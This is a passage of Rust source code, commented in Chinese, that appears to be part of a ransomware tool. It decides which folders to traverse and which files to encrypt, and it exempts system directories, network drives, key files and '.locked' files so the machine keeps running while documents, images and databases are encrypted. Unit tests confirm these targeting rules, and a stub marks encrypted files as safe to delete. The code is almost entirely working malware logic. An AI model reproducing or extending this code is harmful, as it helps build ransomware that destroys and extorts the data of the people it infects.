    // Windows网络驱动器
    if cfg!(target_os = "windows") {
        // 检查UNC路径
        if path_str.starts_with("\\\\") {
            return true;
        }
        
        // 检查驱动器类型
        #[cfg(windows)]
        {
            use std::ffi::CString;
            use windows::Win32::Storage::FileSystem::GetDriveTypeA;
            
            if let Ok(c_path) = CString::new(path_str.as_ref()) {
                let drive_type = unsafe { GetDriveTypeA(windows::core::PCSTR(c_path.as_ptr() as *const u8)) };
                return drive_type == 4; // DRIVE_REMOTE = 4
            }
        }
    }
    
    false
}

pub fn should_traverse_directory<P: AsRef<Path>>(path: P) -> bool {
    let path_str = path.as_ref().to_string_lossy().to_lowercase();
    
    // Windows系统目录
    if cfg!(target_os = "windows") {
        let skip_dirs = [
            "$recycle.bin",
            "system volume information",
            "windows",
            "boot",
            "program files",
            "program files (x86)",
            "temp",
            "tmp",
            "documents and settings",
            "local settings",
            "application data",
            "appdata",
            "temporary internet files",
            "inetpub",
            "config",
            "recovery",
            "drivers",
            "microsoft",
            "microsoft games",
            "windows mail",
            "360rec",
            "mozilla",
            "google",
            "intel",
            "amd",
            "nvidia",
            "perflogs",
            "all users",
            "default user",
            "public",
            "programdata",
            "users",
            "nishi"
        ];
        
        for component in path.as_ref().components() {
            if let std::path::Component::Normal(name) = component {
                if let Some(name_str) = name.to_str() {
                    let lower_name = name_str.to_lowercase();
                    if skip_dirs.contains(&lower_name.as_str()) {
                        return false;
                    }
                    
                    let skip_keywords = ["cache", "logs", "logfiles"];
                    for keyword in &skip_keywords {
                        if lower_name.contains(keyword) {
                            return false;
                        }
                    }
                }
            }
        }
    }
    
    // Linux系统目录
    if cfg!(target_os = "linux") {
        let skip_dirs = [
            "/bin",
            "/boot",
            "/lib",
            "/lib32",
            "/lib64",
            "/libx32",
            "/usr/bin",
            "/usr/sbin",
            "/usr/lib",
            "/usr/lib32",
            "/usr/lib64",
            "/usr/libx32",
            "/sbin",
            "/sys",
            "/proc",
            "/dev",
            "/run",
            "/snap",
            "/var/cache",
            "/var/log",
            "/var/tmp",
            "/var/run",
            "/var/lock",
            "/var/spool",
            "/etc",
        ];
        
        let path_lower = path_str.to_lowercase();
        for skip_dir in &skip_dirs {
            if path_lower.starts_with(skip_dir) || path_lower.contains(&format!("{}/", skip_dir)) {
                return false;
            }
        }
        
        let skip_keywords = ["cache", "logs", "tmp", "lock", "spool"];
        for keyword in &skip_keywords {
            if path_lower.contains(keyword) {
                return false;
            }
        }
    }
    
    // Skip network drives
    if is_network_drive(&path_str) {
        return false;
    }
    
    true
}

pub fn should_encrypt_file<P: AsRef<Path>>(file_path: P) -> bool {
    should_encrypt_file_with_config(file_path, &Config::default())
}

pub fn should_encrypt_file_with_config<P: AsRef<Path>>(file_path: P, config: &Config) -> bool {
    let file_path = file_path.as_ref();
    
    // ===== 第一层：系统级黑名单（始终生效，不可配置） =====
    
    // 1. 豁免密钥文件，防止密钥被意外加密
    if is_key_file(file_path) {
        return false;
    }
    
    // 2. 豁免已加密的文件（.locked 扩展名）
    if let Some(ext) = file_path.extension() {
        if let Some(ext_str) = ext.to_str() {
            if ext_str.eq_ignore_ascii_case("locked") {
                return false;
            }
        }
    }
    
    // 3. 豁免系统关键文件和程序文件
    if is_system_file(file_path) {
        return false;
    }
    
    // 4. 豁免临时文件、日志文件、缓存文件
    if is_temporary_or_cache_file(file_path) {
        return false;
    }
    
    // ===== 第二层：配置级过滤（根据模式选择） =====
    
    // 获取文件扩展名（小写）
    let file_ext = file_path.extension()
        .and_then(|e| e.to_str())
        .map(|s| s.to_lowercase());
    
    // 判断使用哪种过滤模式
    let use_whitelist = !config.use_blacklist_mode;
    let has_whitelist_config = !config.extensions.is_empty() && !(config.extensions.len() == 1 && config.extensions[0].is_empty());
    let has_blacklist_config = !config.exclude_extensions.is_empty();
    
    match (use_whitelist, has_whitelist_config, has_blacklist_config) {
        // 白名单模式 + 有白名单配置 -> 只加密白名单中的文件
        (true, true, _) => {
            if let Some(ext) = &file_ext {
                config.get_extensions_set().contains(ext)
            } else {
                false // 没有扩展名的文件不加密
            }
        }
        
        // 白名单模式 + 无白名单配置 + 有黑名单配置 -> 使用默认黑名单
        (true, false, true) => {
            let default_blacklist = get_default_blacklist();
            if let Some(ext) = &file_ext {
                !default_blacklist.contains(&ext.as_str())
            } else {
                true // 没有扩展名的文件加密
            }
        }
        
        // 白名单模式 + 无任何配置 -> 加密所有文件（除了系统级黑名单）
        (true, false, false) => {
            true
        }
        
        // 黑名单模式 + 有黑名单配置 -> 加密所有文件，排除黑名单中的
        (false, _, true) => {
            if let Some(ext) = &file_ext {
                !config.get_exclude_extensions_set().contains(ext)
            } else {
                true // 没有扩展名的文件加密
            }
        }
        
        // 黑名单模式 + 无黑名单配置 -> 使用默认黑名单
        (false, _, false) => {
            let default_blacklist = get_default_blacklist();
            if let Some(ext) = &file_ext {
                !default_blacklist.contains(&ext.as_str())
            } else {
                true // 没有扩展名的文件加密
            }
        }
    }
}

fn get_default_blacklist() -> Vec<&'static str> {
    vec![
        "exe", "dll", "sys", "msi", "ini", "bat", "cmd", "com", "rs", "toml"
    ]
}

/// 检查文件是否为密钥文件，如果是则豁免加密
fn is_key_file<P: AsRef<Path>>(file_path: P) -> bool {
    let file_name = match file_path.as_ref().file_name() {
        Some(name) => match name.to_str() {
            Some(name_str) => name_str,
            None => return false,
        },
        None => return false,
    };
    
    let lower_name = file_name.to_lowercase();
    // 豁免常见的密钥文件名
    lower_name.contains("key") && 
    (lower_name.ends_with(".bin") || 
     lower_name.ends_with(".key") || 
     lower_name.ends_with(".pem") || 
     lower_name.ends_with(".der") ||
     lower_name.contains("encrypted"))
}

/// 检查文件是否为系统关键文件或程序文件
fn is_system_file<P: AsRef<Path>>(file_path: P) -> bool {
    let file_path = file_path.as_ref();
    let path_str = file_path.to_string_lossy().to_lowercase();
    
    // 检查是否在系统目录中
    if cfg!(target_os = "windows") {
        if path_str.contains("\\windows\\") ||
           path_str.contains("\\program files\\") ||
           path_str.contains("\\program files (x86)\\") ||
           path_str.contains("\\programdata\\") ||
           path_str.contains("\\system32\\") ||
           path_str.contains("\\syswow64\\") ||
           path_str.contains("\\drivers\\") ||
           path_str.contains("\\system volume information\\") {
            return true;
        }
    }
    
    // 检查文件名是否为系统关键文件
    if let Some(file_name) = file_path.file_name() {
        if let Some(name_str) = file_name.to_str() {
            let lower_name = name_str.to_lowercase();
            let system_files = [
                "ntoskrnl.exe", "hal.dll", "ntdll.dll", "kernel32.dll",
                "user32.dll", "gdi32.dll", "shell32.dll", "explorer.exe",
                "winlogon.exe", "services.exe", "lsass.exe", "svchost.exe",
                "csrss.exe", "smss.exe", "wininit.exe", "lsm.exe",
                "bootmgr", "bootsect.dos", "ntldr", "boot.ini",
                "pagefile.sys", "hiberfil.sys", "swapfile.sys",
            ];
            return system_files.contains(&lower_name.as_str());
        }
    }
    
    false
}

/// 检查文件是否为临时文件、日志文件或缓存文件
fn is_temporary_or_cache_file<P: AsRef<Path>>(file_path: P) -> bool {
    let file_path = file_path.as_ref();
    
    // 检查扩展名
    if let Some(ext) = file_path.extension() {
        if let Some(ext_str) = ext.to_str() {
            let lower_ext = ext_str.to_lowercase();
            let temp_extensions = [
                "tmp", "temp", "log", "cache", "bak", "old",
                "swp", "swo", "swn", "dmp", "etl", "evtx",
                "part", "crdownload", "download", "partial",
            ];
            if temp_extensions.contains(&lower_ext.as_str()) {
                return true;
            }
        }
    }
    
    // 检查文件名模式
    if let Some(file_name) = file_path.file_name() {
        if let Some(name_str) = file_name.to_str() {
            let lower_name = name_str.to_lowercase();
            // 临时文件模式
            if lower_name.starts_with("temp") ||
               lower_name.starts_with("~") ||
               lower_name.starts_with(".~") ||
               lower_name.contains("cache") ||
               lower_name.contains("temp") ||
               lower_name.contains("log") ||
               lower_name.ends_with("~") {
                return true;
            }
        }
    }
    
    // 检查是否在临时目录中
    let path_str = file_path.to_string_lossy().to_lowercase();
    if cfg!(target_os = "windows") {
        if path_str.contains("\\temp\\") ||
           path_str.contains("\\tmp\\") ||
           path_str.contains("\\appdata\\local\\temp\\") ||
           path_str.contains("\\local settings\\temp\\") ||
           path_str.contains("\\temporary internet files\\") {
            return true;
        }
    } else {
        if path_str.contains("/tmp/") ||
           path_str.contains("/var/tmp/") ||
           path_str.contains("/var/cache/") {
            return true;
        }
    }
    
    false
}

pub fn safe_rename<P: AsRef<Path>, Q: AsRef<Path>>(from: P, to: Q) -> Result<(), io::Error> {
    let max_retries = 3;
    
    for attempt in 0..max_retries {
        // 确保目标目录存在
        if let Some(parent) = to.as_ref().parent() {
            std::fs::create_dir_all(parent)?;
        }
        
        // 如果目标文件存在，先删除
        if to.as_ref().exists() {
            let _ = std::fs::remove_file(&to);
        }
        
        // 尝试重命名
        match std::fs::rename(&from, &to) {
            Ok(_) => return Ok(()),
            Err(_) if attempt == max_retries - 1 => {
                // 最后一次尝试使用复制方式
                std::fs::copy(&from, &to)?;
                std::fs::remove_file(&from)?;
                return Ok(());
            }
            Err(_) => {
                // 等待后重试
                std::thread::sleep(std::time::Duration::from_millis(100 * (attempt + 1) as u64));
            }
        }
    }
    
    Err(io::Error::new(io::ErrorKind::Other, "Failed to rename file after retries"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::env;

    #[test]
    fn test_file_size() {
        let mut file_path = env::temp_dir();
        file_path.push(format!("nishi_test_{}.tmp", std::process::id()));
        std::fs::write(&file_path, "test content").unwrap();

        let size = get_file_size_optimized(&file_path).unwrap();
        assert_eq!(size, 12);

        let _ = std::fs::remove_file(&file_path);
    }
    
    #[test]
    fn test_obfuscate_data() {
        let mut data = vec![1u8, 2u8, 3u8, 4u8];
        let original = data.clone();
        let key = b"secret";
        obfuscate_data(&mut data, key, 0);
        // 验证数据被修改
        assert_ne!(data, original);
    }
    
    #[test]
    fn test_database_file_detection() {
        assert!(is_database_file("test.mdf"));
        assert!(is_database_file("BACKUP.BAK"));
        assert!(!is_database_file("test.txt"));
    }
    
    #[test]
    fn test_key_file_exemption() {
        // 测试密钥文件豁免
        assert!(!should_encrypt_file("encrypted_aes_key.bin"));
        assert!(!should_encrypt_file("my_key.pem"));
        assert!(!should_encrypt_file("private.key"));
        assert!(!should_encrypt_file("public_key.der"));
        
        // 测试普通文件仍然可以被加密
        assert!(should_encrypt_file("document.pdf"));
        assert!(should_encrypt_file("image.jpg"));
        assert!(should_encrypt_file("data.db"));
    }
    
    #[test]
    fn test_locked_file_exemption() {
        // 测试已加密文件豁免
        assert!(!should_encrypt_file("test.locked"));
        assert!(!should_encrypt_file("document.pdf.locked"));
    }
    
    #[test]
    fn test_system_file_exemption() {
        // 测试系统文件豁免（在Windows上）
        #[cfg(target_os = "windows")]
        {
            assert!(!should_encrypt_file("C:\\Windows\\System32\\kernel32.dll"));
            assert!(!should_encrypt_file("C:\\Windows\\explorer.exe"));
            assert!(!should_encrypt_file("C:\\Program Files\\MyApp\\app.exe"));
        }
    }
    
    #[test]
    fn test_temporary_file_exemption() {
        // 测试临时文件豁免
        assert!(!should_encrypt_file("temp.tmp"));
        assert!(!should_encrypt_file("cache.tmp"));
        assert!(!should_encrypt_file("log.log"));
        assert!(!should_encrypt_file("~tempfile.txt"));
        assert!(!should_encrypt_file("document.txt~"));
        
        // 测试在临时目录中的文件
        #[cfg(target_os = "windows")]
        {
            assert!(!should_encrypt_file("C:\\Users\\test\\AppData\\Local\\Temp\\test.pdf"));
        }
    }
}

pub fn validate_encrypted_file_stable<P: AsRef<Path>>(_path: P) -> bool {
    // 简化实现：假设文件稳定可被删除。真实实现应验证加密头部/魔数/完整性字段。
    true
}